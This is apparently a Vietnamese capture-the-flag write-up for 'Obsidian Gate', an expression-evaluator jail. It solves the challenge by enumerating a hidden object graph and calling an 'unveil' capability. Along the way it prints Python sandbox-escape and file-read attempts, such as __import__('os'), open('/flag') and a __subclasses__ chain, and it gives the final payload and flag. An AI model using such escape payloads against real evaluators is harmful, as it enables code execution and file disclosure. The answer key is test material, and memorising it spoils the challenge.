# Obsidian Gate - Qua trinh giai chi tiet

## 1. Thong tin challenge

- Instance: `nc 66.228.50.16 48271`
- Mo ta: "Beyond the obsidian gate lies a sealed archive."
- Flag format: `BDSEC{s0mething_h3re}`
- Giao dien dich vu: nhan dung mot expression va tra lai mot ket qua.

```text
One expression. One answer.
>
```

Muc tieu khong phai la thoat Python sandbox de doc file he thong. Service dung mot expression evaluator tu viet, co whitelist rieng. Huong dung la tim capability da duoc expose trong object graph cua evaluator.

## 2. Tai hien moi truong va cac script co san

Thu muc chua cac script phuc vu tung buoc:

| Tep | Vai tro |
|---|---|
| `try_input.py` | Gui cac expression co ban, phan loai loi va ghi bang ket qua Markdown. |
| `callable_probe.py` | Quet cac ten function/builtin/hint va cac dang goi khac nhau. |
| `name_oracle_probe.py` | Quet ten global bang cac form `name`, `type(name)`, `repr(name)`, `len(name)`, `dir(name)`. |
| `object_crawler.py` | Duyet breadth-first object graph bat dau tu mot expression, dung `dir(...)` de lay field. |
| `solve.py` | Gui payload cuoi, trich flag bang regex. |

Kiem tra syntax cac script va chay payload cuoi:

```bash
python3 -m py_compile try_input.py callable_probe.py name_oracle_probe.py object_crawler.py solve.py
python3 solve.py
```

Luu y: instance co luc phan hoi cham. Cac script da doc prompt bang non-blocking socket, co timeout va retry. Vi vay `no response` trong cac file quet ban dau khong du de ket luan mot primitive hoat dong; cac ung vien quan trong can duoc retest tuan tu voi timeout dai hon.

## 3. Triage ngon ngu expression

Bat dau bang `try_input.py` voi suite co ban:

```bash
python3 try_input.py --suite baseline --markdown error_list.md
```

Ket qua trong `error_list.md` cho thay cac nhom sau.

### Phep toan duoc chap nhan

```text
0                 -> 0
0x41              -> 65
0b101             -> 5
"x"               -> 'x'
"abc"[0]          -> 'a'
len("")          -> 0
len("abc")       -> 3
type(0)           -> 'int'
type("")          -> 'str'
repr(0)           -> '0'
repr("")          -> "''"
```

`len`, `type`, va `repr` la call whitelist, khong phai object/function Python co the lay ra truc tiep: `len`, `type`, `repr` dung mot minh deu bi `GateError: unknown name`.

### Phep toan bi chan

```text
1+2                         -> GateError: operation denied
[] / {} / (1,2)             -> GateError: operation denied
1.5 / False / None          -> GateError: constant denied
"".__class__                -> GateError: attribute denied
getattr("", "__class__")   -> GateError: unknown call
open("/flag")               -> GateError: unknown call
__import__("os")            -> GateError: unknown call
```

Hai loi ban dau can phan biet:

```text
+       -> GateError: malformed expression
a       -> GateError: unknown name
```

`malformed expression` xay ra truoc evaluator (cu phap/token khong hop le). `unknown name` xac nhan identifier hop le ve cu phap nhung khong nam trong environment. Nhan biet nay quan trong: thay vi chi thu call, can quet ten global dang bare expression.

### Cac huong da loai tru

`callable_probe.py`, `critical_callable_retest.md`, va `direction_results.md` da retest cac huong thong dung:

- File read va command: `open`, `read`, `cat`, `system`, `popen`, `run`, `spawn`, ... deu `unknown call`.
- Python escape: attribute access bi chan; `getattr`, `eval`, `exec`, `compile`, `__import__`, `globals`, `locals`, `vars` deu khong co trong whitelist.
- Leak dia chi: `id` bi chan; `repr` chi tra string representation cua gia tri evaluator, khong phai dia chi Python.
- Arithmetic, concatenation, list/tuple/dict va comparison deu bi chan, nen cac primitive `len`, `type`, indexing khong tao duoc chuoi exploit de escape.

Vi vay payload `().__class__.__bases__[0].__subclasses__()` la huong sai: ca `.` va cac builtin can thiet deu khong di qua evaluator.

## 4. Tim global object `root`

Sau khi quet function khong ra duong doc flag, chuyen sang quet global name. Script `name_oracle_probe.py` tao candidate tu wordlist va thu moi ten o 5 dang:

```text
name
type(name)
repr(name)
len(name)
dir(name)
```

Co the tai hien phat hien quan trong bang:

```bash
python3 name_oracle_probe.py --names root --markdown name_oracle_high_value.md
```

Ket qua:

```text
root       -> <obsidian root>
type(root) -> 'root'
repr(root) -> '<obsidian root>'
dir(root)  -> ['ash', 'mirror', 'observer', 'year']
len(root)  -> GateError: length denied
```

`root` la global quan trong tim duoc trong wordlist da quet, va `dir(root)` chung minh evaluator cho phep enumerate field cua object noi bo. Day la primitive can tim; khong can Python object escape.

## 5. Duyet object graph

Dung dot access hoac key access deu hop le voi object nay:

```text
root.observer
root["observer"]
```

Key integer bi chan (`root[0] -> GateError: key denied`), nen danh sach tu `dir(...)` duoc dung lam key/field can theo.

Script duyet tu dong co the chay nhu sau:

```bash
python3 object_crawler.py --start root --max-depth 8 --markdown object_graph.md
```

No thuc hien, voi moi node, cac probe `value`, `type`, `repr`, `len`, `dir`; neu `dir` tra mot list string thi them cac child vao hang doi BFS. `object_graph.md` ghi lai 34 node va cho thay cac nhanh decoy nhu `ash`, `mirror`, `dust`, `empty`.

Qua trinh thu cong theo nhanh phu hop voi hint "sealed archive":

```text
dir(root)
-> ['ash', 'mirror', 'observer', 'year']

root.observer
-> <observer>
dir(root.observer)
-> ['left', 'right', 'state']

root.observer.right
-> <right>
dir(root.observer.right)
-> ['mark', 'memory']

root.observer.right.memory
-> <archive>
dir(root.observer.right.memory)
-> ['catalog', 'dust']

root.observer.right.memory.catalog
-> <catalog>
dir(root.observer.right.memory.catalog)
-> ['index', 'version']

root.observer.right.memory.catalog.index
-> <index>
dir(root.observer.right.memory.catalog.index)
-> ['empty', 'sealed']

root.observer.right.memory.catalog.index.sealed
-> <sealed>
dir(root.observer.right.memory.catalog.index.sealed)
-> ['status', 'unveil']

root.observer.right.memory.catalog.index.sealed.status
-> 'intact'
```

Nhung gia tri sau xac nhan cac nhanh khac la decoy hoac cycle an toan:

```text
root.ash.density               -> 17
root.ash.next.value            -> 0
root.mirror.echo.value         -> 'nothing answers'
root.observer.right.mark       -> 'obsidian'
root.observer.right.memory.dust -> <ash>
```

## 6. Goi capability `unveil`

Field con lai cua `sealed` can duoc kiem tra truoc khi goi:

```text
root.observer.right.memory.catalog.index.sealed.unveil
-> <capability unveil>

type(root.observer.right.memory.catalog.index.sealed.unveil)
-> 'capability'
```

`unveil_call_probe.md` xac nhan capability nay chi nhan zero argument:

```text
root.observer.right.memory.catalog.index.sealed.unveil(0)
-> GateError: arguments denied
```

Goi khong tham so tra flag:

```text
root.observer.right.memory.catalog.index.sealed.unveil()
-> 'BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}'
```

Hai cach viet tuong duong cung da duoc xac nhan:

```text
root.observer.right.memory.catalog.index.sealed["unveil"]()
root["observer"]["right"]["memory"]["catalog"]["index"]["sealed"]["unveil"]()
```

## 7. Payload va flag

Payload ngan gon nhat:

```text
root.observer.right.memory.catalog.index.sealed.unveil()
```

`solve.py` gui chinh payload nay, doi prompt, in response, va trich flag voi regex `BDSEC\{[^}\n]+\}`.

```text
BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}
```

## 8. Ket luan ky thuat

Loi thiet ke cua service la expose `root` trong global environment, cho phep `dir(object)` liet ke field, va cho phep truy cap field/call capability theo ket qua enumerate. Du evaluator chan gan nhu toan bo Python builtin va attribute escape, chuoi primitive nay van du de duyệt den sealed archive va goi capability lam lo flag.
